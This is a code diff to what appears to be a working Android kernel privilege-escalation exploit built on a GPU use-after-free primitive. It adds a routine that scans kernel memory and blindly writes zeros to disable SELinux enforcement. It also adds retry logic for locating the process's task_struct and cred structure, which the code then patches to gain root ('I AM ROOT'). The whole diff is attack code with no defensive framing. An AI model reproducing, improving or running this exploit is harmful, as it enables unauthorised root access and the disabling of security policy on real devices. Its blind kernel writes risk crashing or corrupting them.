@@ -57,6 +57,7 @@
 #define GBUF_TASK_VA         0xb08
 #define GBUF_CRED_PTR        0xb10
 #define GBUF_REAL_CRED_PTR   0xb18
+#define GBUF_COMM_OFF        0xb20
 #define GBUF_TARGET_PID      0x40
 #define GBUF_FOUND_PID       0x300
 #define GBUF_SET_TASKS       0x200
@@ -90,6 +91,64 @@ static void flush_icache(void *addr, size_t len)
 {
     __builtin___clear_cache((char *)addr, (char *)addr + len);
     __sync_synchronize();
+}
+
+static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size);
+static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size);
+static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value);
+
+static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
+    if (kbase == 0) return 0;
+    
+    fprintf(stderr, "[SELINUX] Aggressive scan for enforcing bit around base 0x%lx...\n", (unsigned long)kbase);
+    
+    // 1. Try to find the string "selinuxu:object_r" in kernel memory
+    // and then look for enforcing near it, or just scan typical ranges.
+    
+    uint64_t scan_ranges[][2] = {
+        {0x2f00000, 0x3100000},
+        {0x3f00000, 0x4100000},
+        {0x2a00000, 0x2c00000},
+    };
+    
+    for (int r = 0; r < 3; r++) {
+        uint64_t start = kbase + scan_ranges[r][0];
+        uint64_t end = kbase + scan_ranges[r][1];
+        
+        fprintf(stderr, "[SELINUX] Scanning range 0x%lx - 0x%lx...\n", (unsigned long)start, (unsigned long)end);
+        
+        uint8_t page[4096];
+        for (uint64_t addr = start; addr < end; addr += 4096) {
+            if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
+                for (int i = 0; i < 4096 - 16; i += 4) {
+                    uint32_t val = *(uint32_t*)(page + i);
+                    if (val == 1) {
+                        // Check if it's surrounded by zeros (typical for enforcing)
+                        uint32_t prev = (i >= 4) ? *(uint32_t*)(page + i - 4) : 0;
+                        uint32_t next = (i <= 4092) ? *(uint32_t*)(page + i + 4) : 0;
+                        if (prev == 0 && next == 0) {
+                             // Potential candidate. Check if it's writable and stays 0.
+                             uint64_t cand = addr + i;
+                             fprintf(stderr, "[SELINUX] Candidate found at 0x%lx (off 0x%lx)\n", (unsigned long)cand, (unsigned long)(cand - kbase));
+                             
+                             uint32_t zero = 0;
+                             gpu_write_task_virt(fd, cand, (uint8_t*)&zero, 4);
+                             uint32_t check = 1;
+                             gpu_read_u32(fd, cand, &check);
+                             if (check == 0) {
+                                 fprintf(stderr, "[SELINUX] Verified! Enforcing is at 0x%lx\n", (unsigned long)cand);
+                                 return cand;
+                             }
+                             // Restore if not the one
+                             uint32_t one = 1;
+                             gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return 0;
 }
 
 static uint64_t find_kernel_base_from_task_va(uint64_t task_va);
@@ -1191,78 +1250,80 @@ static void safe_cred_patch(void)
     // Centering 8KB buffer around the marker (task_va)
     uint8_t *big_task_data = malloc(8192);
     uint64_t read_base = (task_va & ~0xFFFULL) - 4096; // Read 2 pages: [prev, current]
+    uint32_t comm_off_hint = *(uint32_t *)&gbuf[GBUF_COMM_OFF];
     
-    fprintf(stderr, "[CHILD] Reading 8KB around marker (base: 0x%lx)...\n", (unsigned long)read_base);
-    if (gpu_read_task_struct(fd, read_base, big_task_data, 4096) == 0 &&
-        gpu_read_task_struct(fd, read_base + 4096, big_task_data + 4096, 4096) == 0) 
-    {
-        uint64_t cred_ptr = 0;
-        int comm_off = -1;
-        // Search for marker in the 8KB buffer
-        for (int i = 0; i < 8192 - 8; i++) {
-            if (memcmp(big_task_data + i, MARKER_NAME, 8) == 0) {
-                comm_off = i;
-                break;
-            }
-        }
-        
-        if (comm_off != -1) {
-            fprintf(stderr, "[CHILD] Marker confirmed at buffer offset 0x%x\n", comm_off);
+    int retries = 3;
+    while (retries--) {
+        fprintf(stderr, "[CHILD] Reading 8KB around marker (base: 0x%lx), retry=%d...\n", (unsigned long)read_base, 2-retries);
+        if (gpu_read_task_struct(fd, read_base, big_task_data, 4096) == 0 &&
+            gpu_read_task_struct(fd, read_base + 4096, big_task_data + 4096, 4096) == 0) 
+        {
+            uint64_t cred_ptr = 0;
+            int comm_off = -1;
             
-            // Search for cred_ptr in a 1.5KB window around comm
-            fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
-            int candidates_count = 0;
-            for (int off = comm_off - 1024; off < comm_off + 256; off += 8) {
-                if (off < 0 || off > 8192 - 8) continue;
-                uint64_t ptr = *(uint64_t *)(big_task_data + off);
-                if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                    candidates_count++;
-                    uint8_t cred_check[64];
-                    if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
-                        uint32_t usage = *(uint32_t *)(cred_check + 0x00);
-                        uint32_t uid_at_4 = *(uint32_t *)(cred_check + 0x04);
-                        
-                        // Flexible check: UID can be at +0 or +4
-                        if ((usage == my_uid) || (uid_at_4 == my_uid)) {
-                            cred_ptr = ptr;
-                            fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx (UID found at %s)\n", 
-                                    (unsigned long)cred_ptr, (usage == my_uid) ? "+0x00" : "+0x04");
-                            break;
-                        }
-                    } else {
-                        fprintf(stderr, "[CHILD]   Candidate at off 0x%x: ptr=0x%lx (GPU read failed)\n", off, (unsigned long)ptr);
+            if (comm_off_hint != 0) {
+                if (memcmp(big_task_data + comm_off_hint, MARKER_NAME, 8) == 0) {
+                    comm_off = comm_off_hint;
+                    fprintf(stderr, "[CHILD] Marker confirmed via hint at buffer offset 0x%x\n", comm_off);
+                }
+            }
+            
+            if (comm_off == -1) {
+                // Search for marker in the 8KB buffer
+                for (int i = 0; i < 8192 - 8; i++) {
+                    if (memcmp(big_task_data + i, MARKER_NAME, 8) == 0) {
+                        comm_off = i;
+                        break;
                     }
                 }
             }
-            if (cred_ptr == 0) {
-                fprintf(stderr, "[CHILD] [!] No matching cred found. Total K-PTR candidates checked: %d\n", candidates_count);
-                // Dump 128 bytes around comm_off for manual analysis
-                fprintf(stderr, "[CHILD] DUMP around comm_off (0x%x):\n", comm_off);
-                for (int d = comm_off - 64; d < comm_off + 64; d += 16) {
-                    if (d < 0 || d > 8192 - 16) continue;
-                    fprintf(stderr, "  0x%04x: %016lx %016lx\n", d, 
-                            *(uint64_t*)(big_task_data + d), *(uint64_t*)(big_task_data + d + 8));
+            
+            if (comm_off != -1) {
+                fprintf(stderr, "[CHILD] Marker found at buffer offset 0x%x\n", comm_off);
+                
+                // Search for cred_ptr in a 1.5KB window around comm
+                fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
+                int candidates_count = 0;
+                // Extended search window for ROG: -1200 to +400
+                for (int off = comm_off - 1200; off < comm_off + 400; off += 8) {
+                    if (off < 0 || off > 8192 - 8) continue;
+                    uint64_t ptr = *(uint64_t *)(big_task_data + off);
+                    if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                        candidates_count++;
+                        uint8_t cred_check[64];
+                        if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
+                            uint32_t usage = *(uint32_t *)(cred_check + 0x00);
+                            uint32_t uid_at_4 = *(uint32_t *)(cred_check + 0x04);
+                            
+                            // Flexible check: UID can be at +0 or +4
+                            if ((usage == my_uid) || (uid_at_4 == my_uid)) {
+                                cred_ptr = ptr;
+                                fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx (UID found at %s)\n", 
+                                        (unsigned long)cred_ptr, (usage == my_uid) ? "+0x00" : "+0x04");
+                                break;
+                            }
+                        }
+                    }
+                }
+                
+                if (cred_ptr != 0) {
+                    patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+                    if (getuid() == 0) {
+                        fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0)\n");
+                        patched = 1;
+                        break;
+                    } else {
+                        setuid(0);
+                        if (getuid() == 0) {
+                            fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
+                            patched = 1;
+                            break;
+                        }
+                    }
                 }
             }
         }
-
-        if (cred_ptr != 0) {
-            patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
-            // Check if UID changed
-            if (getuid() == 0) {
-                fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0)\n");
-                patched = 1;
-            } else {
-                // Try setuid(0) just in case
-                setuid(0);
-                if (getuid() == 0) {
-                    fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
-                    patched = 1;
-                }
-            }
-        } else {
-            fprintf(stderr, "[CHILD] [!] Failed to find cred_ptr in 8KB window.\n");
-        }
+        usleep(500000); // Wait 0.5s before retry
     }
     free(big_task_data);
 
@@ -1679,9 +1740,13 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         // Target bash fallback
         if (marker_off == -1 && kptrs > 50 && (strstr(found_str, "bash") || strstr(found_str, "/bin/sh"))) {
              fprintf(stderr, "\n      [!!!] Found BASH/SH task_struct candidate at VA 0x%lx!", (unsigned long)va);
+             // Dump 64 bytes for verification
+             fprintf(stderr, "\n      DUMP: ");
+             for (int i = 0; i < 64; i++) fprintf(stderr, "%02x ", data[i]);
+             
              // Save to gbuf for potential hijacking if KETO is not found
-             if (*(uint64_t*)(gbuf + 0xb08) == 0) {
-                 *(uint64_t*)(gbuf + 0xb08) = va;
+             if (*(uint64_t*)(gbuf + GBUF_TASK_VA) == 0) {
+                 *(uint64_t*)(gbuf + GBUF_TASK_VA) = va;
                  fprintf(stderr, " (saved as backup target)");
              }
         }
@@ -1918,6 +1983,9 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                             }
                         }
                         if (c_off != -1) {
+                            *(uint32_t *)&gbuf[GBUF_COMM_OFF] = c_off;
+                            fprintf(stderr, "      [!!!] Parent saved comm_off_hint (0x%x) to gbuf\n", c_off);
+                            
                             uint64_t c_ptr = 0, rc_ptr = 0;
                             uid_t my_uid = getuid();
                             fprintf(stderr, "      [*] Parent searching for cred_ptr near c_off 0x%x (UID %d)...\n", c_off, my_uid);
@@ -2992,10 +3060,11 @@ restart:;
     {
         uint64_t auto_offset = find_offsets_auto(kbase);
         selinux_enforcing = kbase + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
+        
         if (selinux_enforcing == 0 || selinux_enforcing == kbase + SELINUX_OFFSET)
         {
-            uint64_t found_selinux = 0;
-            selinux_enforcing = kbase + SELINUX_OFFSET;
+            // Aggressive scan
+            selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kbase);
         }
     }
     else
